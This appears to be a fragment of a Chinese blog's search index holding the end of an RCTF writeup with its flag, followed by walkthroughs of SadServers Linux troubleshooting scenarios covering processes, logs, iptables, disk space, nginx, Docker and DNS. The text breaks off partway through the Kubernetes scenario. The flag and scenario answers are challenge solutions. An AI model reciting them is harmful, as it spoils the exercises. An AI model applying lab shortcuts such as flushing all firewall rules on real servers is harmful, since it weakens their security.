<p>\u62fc\u8d77\u6765\u5c31\u662f flag: RCTF{Si13nc3_15_nEvEr_9ivin9_up_&amp;&amp;_6ut_h01din9_On_Si13nT1y}</p> <p>\u53cd\u6b63\u5c31\u662f\u611f\u89c9\u786c\u85cf\u6ca1\u5565\u610f\u601d\uff0c\u800c\u4e14\u5355\u8bcd\u987a\u5e8f\u5176\u5b9e\u8fd8\u5e76\u4e0d\u786e\u5b9a\uff0c\u786c\u731c\u3002</p>"},{"location":"writeups/sadservers/","title":"SadServers Writeup","text":"<p> \u7ea6 3871 \u4e2a\u5b57  719 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 22 \u5206\u949f</p> <p>Abstract</p> <p>\u6c34 tg \u53d1\u73b0\u7684\uff0c\u633a\u597d\u73a9\u7684\uff0c\u5c31\u505a\u4e00\u505a\uff0c\u5b66\u5230\u5f88\u591a\uff0c\u5c31\u5199\u4e00\u5199\u3002</p> <p>\u5e73\u53f0\u5730\u5740\u5728 https://sadservers.com/ \u3002\u5927\u6982\u7c7b\u4f3c\u8fd0\u7ef4\uff1f\u53cd\u6b63\u5927\u6982\u5c31\u662f\u4fee\u590d\u4e00\u4e9b Linux \u670d\u52a1\u5668\u51fa\u73b0\u7684\u95ee\u9898\u3002</p> <p>\u4e0d\u7b97 CTF\uff0c\u4e0d\u77e5\u9053\u548b\u5206\u7c7b\uff0c\u5c31\u6254\u8fd9\u91cc\u5427</p> <p>\u770b\u8d77\u6765\u9898\u76ee\u4e0d\u591a\uff0c\u636e\u8bf4\u662f \"new challenges weekly\"\uff0c\u51fa\u7684\u8bdd\u6216\u8bb8\u53ef\u4ee5\u968f\u65f6\u66f4\u65b0\uff1f\uff08\u5495\u5495\u5495</p>"},{"location":"writeups/sadservers/#saint-john","title":"\"Saint John\"","text":"<p>Scenario: \"Saint John\": what is writing to this log file?</p> <p>Level: Easy</p> <p>Description: A developer created a testing program that is continuously writing to a log file /var/log/bad.log and filling up disk. You can check for example with <code>tail -f /var/log/bad.log</code>. This program is no longer needed. Find it and terminate it.</p> <p>OS: Ubuntu 22.04 LTS</p> <p>\u53ef\u4ee5 tail -f /var/log/bad.log \u770b\u4e00\u773c\u786e\u5b9e\u5728\u4e00\u76f4\u586b\u4e1c\u897f\u3002\u7136\u540e\u5f53\u7136\u662f\u5148\u67e5\u4e00\u4e0b\u540e\u53f0\u8fdb\u7a0b ps -aux\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u6761\u5f88\u53ef\u7591\uff1a <pre><code>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n...\nubuntu       610  0.0  1.7  17672  8212 ?        S    07:57   0:00 /usr/bin/python3 /home/ubuntu/badlog.py\n...\n</code></pre> \u53ef\u4ee5 cat \u770b\u4e00\u4e0b badlog.py: <pre><code>#! /usr/bin/python3\n# test python writing to a file\n\nimport random\nimport time\nfrom datetime import datetime\n\nf = open('/var/log/bad.log', 'a')\nwhile True:\n  r = random.randrange(2147483647)\n  f.write(str(datetime.now()) + ' token: ' + str(r) + '\\n')\n  f.flush()\n  time.sleep(1)\n</code></pre> \u786e\u5b9e\u662f\u5728\u6bcf\u4e00\u79d2\u5199\u4e00\u884c\u3002\u6240\u4ee5\u76f4\u63a5 kill -9 610 \u5f3a\u5236\u6740\u6b7b\u8fd9\u4e2a\u8fdb\u7a0b\u5c31\u597d\u4e86\u3002</p> <p>\u9898\u76ee\u7684\u672c\u610f\u5927\u6982\u662f\u7528 lsof \u6765\u67e5\u770b\u4f7f\u7528\u67d0\u4e00\u6587\u4ef6\u7684\u8fdb\u7a0b\uff1a <pre><code>ubuntu@ip-172-31-32-108:/$ lsof /var/log/bad.log \nCOMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF  NODE NAME\nbadlog.py 610 ubuntu    3w   REG  259,1    31275 67701 /var/log/bad.log\n</code></pre></p> <p>\u7136\u540e\u540c\u6837\u662f\u5f3a\u6740\u3002</p>"},{"location":"writeups/sadservers/#saskatoon","title":"\"Saskatoon\"","text":"<p>Scenario: \"Saskatoon\": counting IPs.</p> <p>Level: Easy</p> <p>Description: There's a web server access log file at /home/admin/access.log. The file consists of one line per HTTP request, with the requester's IP address at the beginning of each line.</p> <p>Find what's the IP address that has the most requests in this file (there's no tie; the IP is unique). Write the solution into a file /home/admin/highestip.txt. For example, if your solution is \"1.2.3.4\", you can do echo \"1.2.3.4\" &gt; /home/admin/highestip.txt</p> <p>OS: Debian 11</p> <p>\u6240\u6709\u9700\u8981\u7684\u4e1c\u897f\u90fd\u5728 access.log \u91cc\u9762\uff0c\u6240\u4ee5\u5199\u4e00\u4e2a python \u811a\u672c\u8bfb\u53d6\u3001\u7edf\u8ba1\u3001\u6392\u5e8f\u3001\u8f93\u51fa\u5c31\u597d\u4e86\uff1a <pre><code>with open(\"/home/admin/access.log\", \"r\") as f:\n    contents = f.readlines()\n\nips = [line.split(\" \")[0] for line in contents]\ncnt = list(set([(ips.count(ip), ip) for ip in ips]))\nprint(sorted(cnt)[-1])\n# (482, '66.249.73.135')\n</code></pre> \u6240\u4ee5\u8bf7\u6c42\u6700\u591a\u7684 ip \u5c31\u662f 66.249.73.135\u3002</p> <p>\u5f53\u7136\u9898\u76ee\u7684\u610f\u601d\u662f\u901a\u8fc7 shell \u547d\u4ee4\u76f4\u63a5\u6765\u505a\u3002\u53ef\u4ee5 cat \u7136\u540e cut \u6765\u53d6\u51fa ip\uff0c\u7136\u540e sort | uniq -c \u6765\u7edf\u8ba1\u6b21\u6570\uff08\u8981\u5148 sort\uff0cuniq \u53ea\u4f1a\u7edf\u8ba1\u76f8\u90bb\u7684\u91cd\u590d\u884c\uff09\uff0c\u4e4b\u540e\u5728 sort \u4e00\u4e0b\uff0c\u6700\u540e\u4e00\u884c\u5c31\u662f\u8981\u7684\u4e86\uff1a <pre><code>$ cat /home/admin/access.log | cut -d ' ' -f 1 | sort | uniq -c | sort | tail -n 1\n    482 66.249.73.135\n</code></pre> \u7528 awk \u6765\u5904\u7406\u4e5f\u5f88\u65b9\u4fbf\uff0c\u76f4\u63a5\u4e00\u884c\u89e3\u51b3\uff1a <pre><code>$ awk '{print $1}' /home/admin/access.log | sort | uniq -c | sort | tail -n 1 | awk '{print $2}' &gt; /home/admin/highestip.txt\n</code></pre></p>"},{"location":"writeups/sadservers/#tokyo","title":"\"Tokyo\"","text":"<p>Scenario: \"Tokyo\": can't serve web file</p> <p>Level: Medium</p> <p>Description: There's a web server serving a file /var/www/html/index.html with content \"hello sadserver\" but when we try to check it locally with an HTTP client like curl 127.0.0.1:80, nothing is returned. This scenario is not about the particular web server configuration and you only need to have general knowledge about how web servers work.</p> <p>OS: Ubuntu 22.04 LTS</p> <p>ps -aux \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a web server \u670d\u52a1\u662f\u7531 apache2 \u63d0\u4f9b\u7684\uff1a <pre><code>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n...\nwww-data     774  0.0  0.9 1211728 4304 ?        Sl   08:27   0:00 /usr/sbin/apache2 -k start\nwww-data     775  0.0  0.9 1211728 4304 ?        Sl   08:27   0:00 /usr/sbin/apache2 -k start\n...\n</code></pre> \u53bb /etc/apache2 \u901b\u4e86\u4e00\u5708\uff0c\u786e\u5b9e\u6ca1\u4ec0\u4e48\u95ee\u9898\u3002</p> <p><code>curl -v 127.0.0.1:80</code>\uff0c\u53d1\u73b0\u6839\u672c\u5c31\u8fde\u4e0d\u4e0a\u3002\u53ef\u80fd\u662f\u9632\u706b\u5899\u7684\u95ee\u9898\uff0c\u770b\u4e00\u4e0b iptables\uff1a <pre><code># iptables -L -n\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nDROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:80\n\nChain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination\n</code></pre> \u53d1\u73b0 INPUT \u94fe\u628a\u6240\u6709 tcp \u5305\u90fd DROP \u4e86\u3002\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u60c5\u51b5\u89c4\u5219\uff1a <pre><code># iptables -F\n</code></pre> \u7136\u540e\u518d curl \u53d1\u73b0\u8fd4\u56de 403 Forbidden\u3002\u68c0\u67e5\u4e00\u4e0b /var/www/html/index.html \u7684\u6743\u9650\uff1a <pre><code># ls -l /var/www/html/index.html\n-rw------- 1 root root 16 Aug  1 00:40 /var/www/html/index.html\n</code></pre> \u6240\u4ee5\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u6743\u9650\uff0c\u8ba9\u6240\u6709\u4eba\u53ef\u8bfb\uff1a <pre><code># chmod +r /var/www/html/index.html\n</code></pre> \u7136\u540e\u518d curl \u5c31\u53ef\u4ee5\u4e86\u3002</p>"},{"location":"writeups/sadservers/#manhattan","title":"\"Manhattan\"","text":"<p>Scenario: \"Manhattan\": can't write data into database.</p> <p>Level: Medium</p> <p>Description: Your objective is to be able to insert a row in an existing Postgres database. The issue is not specific to Postgres and you don't need to know details about it (although it may help).</p> <p>Helpful Postgres information: it's a service that listens to a port (:5432) and writes to disk in a data directory, the location of which is defined in the data_directory parameter of the configuration file /etc/postgresql/14/main/postgresql.conf. In our case Postgres is managed by systemd as a unit with name postgresql.</p> <p>OS: Debian 10</p> <p>\u6709\u4e00\u4e9b\u96be\u5ea6\uff0c\u770b\u4e86\u4e9b\u63d0\u793a\u3002</p> <p>\u9996\u5148 <code>systemctl status postgresql</code> \u53ef\u4ee5\u770b\u51fa postgresql \u786e\u5b9e\u5728\u8fd0\u884c\uff0c\u4f46\u662f\u8fde\u4e0d\u4e0a\u3002\u770b\u4e00\u770b /var/log/syslog \u6ca1\u6709\u4ec0\u4e48\u5f02\u6837\u3002</p> <p>\u8bd5\u7740 <code>systemctl restart postgresql</code> \u91cd\u542f postgresql\uff0c\u6ca1\u6709\u62a5\u9519\uff0c\u4f46\u662f /var/log/syslog \u91cc\u9762\u53ef\u4ee5\u770b\u5230\u9519\u8bef\uff1a <pre><code>Nov  3 09:11:58 ip-172-31-47-134 postgresql@14-main[884]: 2022-11-03 09:11:58.882 UTC [889] FATAL:  could not create lock file \"postmaster.pid\": No space left on device\n</code></pre> No space left on device\uff0c\u6240\u4ee5 df \u770b\u4e00\u4e0b\u78c1\u76d8\u7528\u91cf\uff1a <pre><code>root@ip-172-31-47-134:/# df\nFilesystem      1K-blocks    Used Available Use% Mounted on\nudev               229200       0    229200   0% /dev\ntmpfs               47660    1520     46140   4% /run\n/dev/nvme1n1p1    8026128 1233676   6363196  17% /\ntmpfs              238300       0    238300   0% /dev/shm\ntmpfs                5120       0      5120   0% /run/lock\ntmpfs              238300       0    238300   0% /sys/fs/cgroup\n/dev/nvme1n1p15    126710     278    126432   1% /boot/efi\n/dev/nvme0n1      8378368 8378340        28 100% /opt/pgdata\n</code></pre> \u53ef\u4ee5\u770b\u5230\u6302\u8f7d\u5728 /opt/pgdata \u4e0a\u7684\u8bbe\u5907\u5bb9\u91cf\u6ee1\u4e86\u3002\u68c0\u67e5\u4e00\u4e0b\u8fd9\u4e2a\u76ee\u5f55\uff1a <pre><code>root@ip-172-31-47-134:/# ls -l /opt/pgdata\ntotal 8285620\n-rw-r--r--  1 root     root             69 May 21 22:20 deleteme\n-rw-r--r--  1 root     root     7516192768 May 21 22:06 file1.bk\n-rw-r--r--  1 root     root      967774208 May 21 22:17 file2.bk\n-rw-r--r--  1 root     root         499712 May 21 22:23 file3.bk\ndrwx------ 19 postgres postgres       4096 May 21 22:24 main\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u4e00\u5806 .bk \u5907\u4efd\u6587\u4ef6\u5360\u6ee1\u4e86\u78c1\u76d8\uff0c\u5220\u9664\u3001\u91cd\u542f\u3001\u6d4b\u8bd5\uff0c\u53d1\u73b0\u4e00\u5207\u6b63\u5e38\u4e86\uff1a <pre><code>root@ip-172-31-47-134:/# rm /opt/pgdata/file*.bk\nroot@ip-172-31-47-134:/# ls -l /opt/pgdata\ntotal 8\n-rw-r--r--  1 root     root       69 May 21 22:20 deleteme\ndrwx------ 19 postgres postgres 4096 May 21 22:24 main\nroot@ip-172-31-47-134:/# systemctl restart postgresql\nroot@ip-172-31-47-134:/# sudo -u postgres psql -c \"insert into persons(name) values ('jane smith');\" -d dt\nINSERT 0 1\n</code></pre></p>"},{"location":"writeups/sadservers/#cape-town","title":"\"Cape Town\"","text":"<p>Scenario: \"Cape Town\": Borked Nginx</p> <p>Level: Medium</p> <p>Description: There's an Nginx web server installed and managed by systemd. Running curl -I 127.0.0.1:80 returns curl: (7) Failed to connect to localhost port 80: Connection refused , fix it so when you curl you get the default Nginx page.</p> <p>OS: Debian 11</p> <p>\u9996\u5148 systemctl status nginx \u68c0\u67e5\u4e00\u4e0b nginx \u8fd0\u884c\u72b6\u6001\uff1a <pre><code>$ sudo systemctl status nginx\n\u25cf nginx.service - The NGINX HTTP and reverse proxy server\n     Loaded: loaded (/etc/systemd/system/nginx.service; enabled; vendor preset: enabled)\n     Active: failed (Result: exit-code) since Thu 2022-11-03 09:30:47 UTC; 42s ago\n    Process: 584 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=1/FAILURE)\n        CPU: 28ms\n\nNov 03 09:30:47 ip-172-31-33-45 systemd[1]: Starting The NGINX HTTP and reverse proxy server...\nNov 03 09:30:47 ip-172-31-33-45 nginx[584]: nginx: [emerg] unexpected \";\" in /etc/nginx/sites-enabled/default:1\nNov 03 09:30:47 ip-172-31-33-45 nginx[584]: nginx: configuration file /etc/nginx/nginx.conf test failed\nNov 03 09:30:47 ip-172-31-33-45 systemd[1]: nginx.service: Control process exited, code=exited, status=1/FAILURE\nNov 03 09:30:47 ip-172-31-33-45 systemd[1]: nginx.service: Failed with result 'exit-code'.\nNov 03 09:30:47 ip-172-31-33-45 systemd[1]: Failed to start The NGINX HTTP and reverse proxy server.\n</code></pre> \u53d1\u73b0\u6709\u62a5\u9519\uff0c\u8bf4\u5728 /etc/nginx/sites-enabled/default:1 \u6709\u4e00\u4e2a unexpected \";\"\uff0c\u6240\u4ee5\u53bb\u5220\u6389\u5b83\uff0c\u7136\u540e\u91cd\u542f\u3002 <pre><code>admin@ip-172-31-33-45:/$ sudo vim /etc/nginx/sites-enabled/default \nadmin@ip-172-31-33-45:/$ sudo systemctl restart nginx\nadmin@ip-172-31-33-45:/$ sudo systemctl status nginx\n\u25cf nginx.service - The NGINX HTTP and reverse proxy server\n     Loaded: loaded (/etc/systemd/system/nginx.service; enabled; vendor preset: enabled)\n     Active: active (running) since Thu 2022-11-03 09:32:32 UTC; 6s ago\n    Process: 868 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=0/SUCCESS)\n    Process: 869 ExecStart=/usr/sbin/nginx (code=exited, status=0/SUCCESS)\n   Main PID: 870 (nginx)\n      Tasks: 2 (limit: 524)\n     Memory: 2.4M\n        CPU: 27ms\n     CGroup: /system.slice/nginx.service\n             \u251c\u2500870 nginx: master process /usr/sbin/nginx\n             \u2514\u2500871 nginx: worker process\n\nNov 03 09:32:32 ip-172-31-33-45 systemd[1]: Starting The NGINX HTTP and reverse proxy server...\nNov 03 09:32:32 ip-172-31-33-45 nginx[868]: nginx: the configuration file /etc/nginx/nginx.conf syntax is ok\nNov 03 09:32:32 ip-172-31-33-45 nginx[868]: nginx: configuration file /etc/nginx/nginx.conf test is successful\nNov 03 09:32:32 ip-172-31-33-45 systemd[1]: Started The NGINX HTTP and reverse proxy server.\n</code></pre> \u5de5\u4f5c\u6b63\u5e38\uff0c\u4f46\u662f curl \u4e00\u4e0b\u4f1a\u5f97\u5230 500\u3002\u68c0\u67e5\u4e00\u4e0b log\uff1a <pre><code>admin@ip-172-31-33-45:/$ cat /var/log/nginx/error.log | tail -n 10\n2022/09/11 16:39:11 [emerg] 5875#5875: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/09/11 16:54:26 [emerg] 5931#5931: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/09/11 16:55:00 [emerg] 5961#5961: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/09/11 17:02:07 [emerg] 6066#6066: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/09/11 17:07:03 [emerg] 6146#6146: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/11/03 09:30:47 [emerg] 584#584: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/11/03 09:32:32 [alert] 870#870: socketpair() failed while spawning \"worker process\" (24: Too many open files)\n2022/11/03 09:32:32 [emerg] 871#871: eventfd() failed (24: Too many open files)\n2022/11/03 09:32:32 [alert] 871#871: socketpair() failed (24: Too many open files)\n2022/11/03 09:33:03 [crit] 871#871: *1 open() \"/var/www/html/index.nginx-debian.html\" failed (24: Too many open files), client: 127.0.0.1, server: _, request: \"GET / HTTP/1.1\", host: \"127.0.0.1\"\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u62a5\u9519 Too many open files\u3002\u641c\u4e86\u4e00\u4e0b\uff0c\u7f51\u4e0a\u63d0\u4f9b\u7684\u65b9\u6cd5\u90fd\u8bd5\u4e86\u4e00\u5708\uff0c\u95ee\u9898\u4e0d\u51fa\u5728 nginx \u7684\u914d\u7f6e\u4e0a\u3002\u7136\u540e\u6839\u636e\u63d0\u793a\u53bb\u770b\u4e86 systemd \u4e0a nginx \u7684\u914d\u7f6e\uff1a <pre><code>admin@ip-172-31-33-45:/$ cat /etc/systemd/system/nginx.service \n[Unit]\nDescription=The NGINX HTTP and reverse proxy server\nAfter=syslog.target network-online.target remote-fs.target nss-lookup.target\nWants=network-online.target\n\n[Service]\nType=forking\nPIDFile=/run/nginx.pid\nExecStartPre=/usr/sbin/nginx -t\nExecStart=/usr/sbin/nginx\nExecReload=/usr/sbin/nginx -s reload\nExecStop=/bin/kill -s QUIT $MAINPID\nPrivateTmp=true\nLimitNOFILE=10\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> \u628a LimitNOFILE=10 \u6539\u6210 LimitNOFILE=1024\uff0c\u7136\u540e\u91cd\u542f nginx \u5373\u53ef\u6b63\u5e38\u5f97\u5230\u54cd\u5e94\uff1a <pre><code>admin@ip-172-31-33-45:/$ sudo systemctl restart nginx\nWarning: The unit file, source configuration file or drop-ins of nginx.service changed on disk. Run 'systemctl daemon-reload' to reload units.\nadmin@ip-172-31-33-45:/$ sudo systemctl daemon-reload\nadmin@ip-172-31-33-45:/$ sudo systemctl restart nginx\nadmin@ip-172-31-33-45:/$ curl -Is 127.0.0.1:80 | head -1\nHTTP/1.1 200 OK\n</code></pre></p>"},{"location":"writeups/sadservers/#salta","title":"\"Salta\"","text":"<p>Scenario: \"Salta\": Docker container won't start.</p> <p>Level: Medium</p> <p>Description: There's a \"dockerized\" Node.js web application in the /home/admin/app directory. Create a Docker container so you get a web app on port :8888 and can curl to it. For the solution to be valid, there should be only one running Docker container.</p> <p>OS: Debian 11</p> <p>\u9996\u5148\u68c0\u67e5\u4e00\u4e0b docker \u5bb9\u5668\uff1a <pre><code>admin@ip-172-31-38-21:/$ sudo docker ps -a\nCONTAINER ID   IMAGE     COMMAND                  CREATED       STATUS                   PORTS     NAMES\n124a4fb17a1c   app       \"docker-entrypoint.s\u2026\"   6 weeks ago   Exited (1) 6 weeks ago             elated_taussig\nadmin@ip-172-31-38-21:~/app$ sudo docker logs 124\nnode:internal/modules/cjs/loader:928\n  throw err;\n  ^\n\nError: Cannot find module '/usr/src/app/serve.js'\n    at Function.Module._resolveFilename (node:internal/modules/cjs/loader:925:15)\n    at Function.Module._load (node:internal/modules/cjs/loader:769:27)\n    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:76:12)\n    at node:internal/main/run_main_module:17:47 {\n  code: 'MODULE_NOT_FOUND',\n  requireStack: []\n}\n</code></pre> \u53d1\u73b0\u62a5\u9519\u4e86\uff0cDockerfile \u91cc\u51fa\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u770b\u4e00\u4e0b\uff1a <pre><code># documentation https://nodejs.org/en/docs/guides/nodejs-docker-webapp/\n\n# most recent node (security patches) and alpine (minimal, adds to security, possible libc issues)\nFROM node:15.7-alpine \n\n# Create app directory &amp; copy app files\nWORKDIR /usr/src/app\n\n# we copy first package.json only, so we take advantage of cached Docker layers\nCOPY ./package*.json ./\n\n# RUN npm ci --only=production\nRUN npm install\n\n# Copy app source\nCOPY ./* ./\n\n# port used by this app\nEXPOSE 8880\n\n# command to run\nCMD [ \"node\", \"serve.js\" ]\n</code></pre> \u53d1\u73b0\u6700\u540e CMD \u91cc server.js \u6253\u6210\u4e86 serve.js\uff0c\u800c\u4e14 EXPOSE \u7684\u7aef\u53e3\u4e5f\u4e0d\u5bf9\u3002\u4e24\u4e2a\u95ee\u9898\u4fee\u4e00\u4e0b\u7136\u540e\u91cd\u65b0\u6784\u5efa\u3001\u8fd0\u884c\uff1a <pre><code>admin@ip-172-31-38-21:~/app$ sudo docker build -t app .\nadmin@ip-172-31-38-21:~/app$ sudo docker rm 124\nadmin@ip-172-31-38-21:~/app$ sudo docker run -d -p 8888:8888 app\ne67b36ff14ff3676e419036180abf9231e97eacc5ec6fe9d76426e7003acfb8f\ndocker: Error response from daemon: driver failed programming external connectivity on endpoint nifty_bhaskara (ce8a09c7a42f730b89e0bd1bd3298de1598d79bf0d08d1532a7f38002cda84d4): Error starting userland proxy: listen tcp4 0.0.0.0:8888: bind: address already in use.\n</code></pre> \u53d1\u73b0\u62a5\u9519 8888 \u7aef\u53e3\u88ab\u5360\u7528\u4e86\u3002\u6ca1\u6709 lsof\uff0c\u7528 netstat \u67e5\u4e00\u4e0b\u7aef\u53e3\uff1a <pre><code>admin@ip-172-31-38-21:~/app$ netstat -tunlp\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -                   \ntcp6       0      0 :::8080                 :::*                    LISTEN      562/gotty           \ntcp6       0      0 :::22                   :::*                    LISTEN      -                   \ntcp6       0      0 :::8888                 :::*                    LISTEN      -                   \ntcp6       0      0 :::6767                 :::*                    LISTEN      563/sadagent        \nudp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   \nudp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   \nudp6       0      0 fe80::8d3:45ff:fee9:546 :::*                                -                   \nudp6       0      0 ::1:323                 :::*                                - \n</code></pre> \u53d1\u73b0 8888 \u7aef\u53e3\u5728\u7528\uff0cps -aux \u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a nginx \u5728\u8fd0\u884c\uff0c\u5728 /etc/nginx/sites-enabled/default \u91cc\u786e\u5b9e\u6709\u4f7f\u7528 8888 \u7aef\u53e3\u3002</p> <p>\u6240\u4ee5\u5148\u505c\u6389 nginx\uff0c\u7136\u540e\u91cd\u65b0\u90e8\u7f72\u5bb9\u5668\u5373\u53ef\uff1a <pre><code>admin@ip-172-31-38-21:~/app$ sudo systemctl stop nginx\nadmin@ip-172-31-38-21:~/app$ sudo docker stop e6\ne6\nadmin@ip-172-31-38-21:~/app$ sudo docker rm e6\ne6\nadmin@ip-172-31-38-21:~/app$ sudo docker run -d -p 8888:8888 app\n...\nadmin@ip-172-31-38-21:~/app$ curl localhost:8888\nHello World!\n</code></pre></p>"},{"location":"writeups/sadservers/#jakarta","title":"\"Jakarta\"","text":"<p>Scenario: \"Jakarta\": it's always DNS.</p> <p>Level: Hard</p> <p>Description: Can't ping google.com. It returns ping: google.com: Name or service not known. Expected is being able to resolve the hostname. (Note: currently the VMs can't ping outside so there's no automated check for the solution).</p> <p>OS: Ubuntu 22.04 LTS</p> <p>\u6839\u636e\u9898\u76ee\u77e5\u9053\u662f dns \u51fa\u4e86\u95ee\u9898\uff0c/etc/resolv.conf \u91cc\u7684\u914d\u7f6e\u90fd\u6ca1\u5565\u95ee\u9898\u3002\u800c\u4e14\u6574\u4e2a sadservers \u662f\u4e0d\u80fd\u8fde\u63a5\u5916\u7f51\u7684\uff0c\u6240\u4ee5\u5927\u6982\u53ea\u80fd\u7528\u672c\u673a\u7684\u4e86\u3002\u641c\u7d22\u4e86\u4e00\u4e0b dns \u76f8\u5173\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u770b\u4e86\u4e00\u5708\u53d1\u73b0 /etc/nsswitch.conf \u91cc\u7684 hosts \u914d\u7f6e\u6709\u95ee\u9898\uff1a <pre><code>hosts:          files\n</code></pre> \u800c\u7f51\u4e0a\u7684\u4f8b\u5b50\u91cc\u90fd\u6709 dns\uff0c\u6240\u4ee5\u5728 files \u540e\u9762\u52a0\u4e00\u4e2a dns \u5c31\u53ef\u4ee5\u4e86\uff1a <pre><code>ubuntu@ip-172-31-42-233:/$ ping google.com\nPING google.com (142.250.191.174) 56(84) bytes of data.\n</code></pre></p>"},{"location":"writeups/sadservers/#bern","title":"\"Bern\"","text":"<p>Scenario: \"Bern\": Docker web container can't connect to db container.</p> <p>Level: Hard</p> <p>Description: There are two Docker containers running, a web application (Wordpress or WP) and a database (MariaDB) as back-end, but if we look at the web page, we see that it cannot connect to the database. curl -s localhost:80 |tail -4 returns:</p> <pre><code>&lt;body id=\"error-page\"&gt; &lt;div class=\"wp-die-message\"&gt;&lt;h1&gt;Error establishing a database connection&lt;/h1&gt;&lt;/div&gt;&lt;/body&gt; &lt;/html&gt;\n</code></pre> <p>This is not a Wordpress code issue (the image is :latest with some network utilities added). What you need to know is that WP uses \"WORDPRESS_DB_\" environment variables to create the MySQL connection string. See the ./html/wp-config.php WP config file for example (from /home/admin).</p> <p>OS: Debian 11</p> <p>docker ps -a \u53ef\u4ee5\u770b\u5230\u6709\u4e24\u4e2a\u5bb9\u5668\u5728\u8fd0\u884c\u3002\u6839\u636e\u9898\u76ee\u7684 test \u53ef\u4ee5\u77e5\u9053 mysql \u7684\u8d26\u53f7\u5bc6\u7801\u662f root:password\u3002</p> <p>WordPress \u542f\u52a8\u4f1a\u4ece\u73af\u5883\u53d8\u91cf\u8bfb\u53d6\u914d\u7f6e\uff0c\u6240\u4ee5\u5728 wordpress \u7684\u5bb9\u5668\u4e2d\u67e5\u4e00\u4e0b env\uff1a <pre><code>admin@ip-172-31-19-232:/$ sudo docker exec wordpress env |grep WORDPRESS_DB_\nWORDPRESS_DB_PASSWORD=password\nWORDPRESS_DB_USER=root\n</code></pre> \u53ef\u4ee5\u770b\u51fa\u7528\u6237\u540d\u548c\u5bc6\u7801\u8bbe\u7f6e\u7684\u662f\u6b63\u786e\u7684\u3002\u4f46\u662f NAME \u548c HOST \u4f7f\u7528\u7684\u5c31\u662f wp-config.php \u4e2d\u9ed8\u8ba4\u7684\u4e86\uff0c\u4e5f\u5c31\u662f wordpress \u548c mysql\uff0cNAME \u7684\u8bdd\u5728 mariadb \u5bb9\u5668\u91cc\u53ef\u4ee5\u770b\u5230\u786e\u5b9e\u662f wordpress\uff0c\u4f46 HOST \u662f mysql\uff0c\u5c31\u8fde\u63a5\u4e0d\u5230\u4e86\u3002</p> <p>\u800c\u9898\u7ed9\u7684 test \u4e00\u5b9a\u8981\u5728 wordpress \u5bb9\u5668\u91cc\u6253\u5f00 mysqladmin\uff0c\u8fde\u63a5 host mysql\u3002\u4e0d\u77e5\u9053\u600e\u4e48\u641e qwq\uff0chint \u6ca1\u518d\u63a5\u7740\u5199\u4e86\uff0c\u516b\u4f1a qwq\u3002</p>"},{"location":"writeups/sadservers/#singara","title":"\"Singara\"","text":"<p>Scenario: \"Singara\": Docker and Kubernetes web app not working.</p> <p>Level: Hard</p> <p>Description: There's a k3s Kubernetes install you can access with kubectl. The Kubernetes YAML manifests under /home/admin have been applied. The objective is to access from the host the \"webapp\" web server deployed and find what message it serves (it's a name of a town or city btw). In order to pass the check, the webapp Docker container should not be run separately outside Kubernetes as a shortcut.</p> <p>OS: Debian 11</p> <p>\u5148\u770b\u4e00\u4e0b k3s \u7684\u914d\u7f6e\u6587\u4ef6\uff1a</p> \u914d\u7f6e\u6587\u4ef6 <p>deployment.yml<pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: webapp-deployment\nnamespace: web\nspec:\nselector:\n    matchLabels:\n    app: webapp\nreplicas: 1\ntemplate:\n    metadata:\n    labels:\n        app: webapp\n    spec:\n    containers:\n    - name: webapp\n        image: webapp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8880\n</code></pre> namespace.yml<pre><code>apiVersion: v1\nkind: Namespace\nmetadata:\nname: web\n</code></pre> nodeport.yml<pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: webapp-service\nnamespace: web\nspec:\ntype: NodePort\nselector:\n    app.kubernetes.io/name: webapp\nports:\n    - port: 80\n    targetPort: 8888\n    nodePort: 30007\n</code></pre></p> <p>\u7136\u540e\u68c0\u67e5\u4e00\u4e0b k3s \u5404\u90e8\u5206\u7684\u72b6\u6001\uff1a <pre><code>admin@ip-10-0-0-64:~$ kubectl get all -n web\nNAME                                     READY   STATUS             RESTARTS   AGE\npod/webapp-deployment-666b67994b-5sffz   0/1     ImagePullBackOff   0          46d\n\nNAME                     TYPE       CLUSTER-IP    EXTERNAL-IP   PORT(S)        AGE\nservice/webapp-service   NodePort   10.43.35.97   &lt;none&gt;        80:30007/TCP   46d\n\nNAME                                READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/webapp-deployment   0/1     1            0           46d\n\nNAME                                           DESIRED 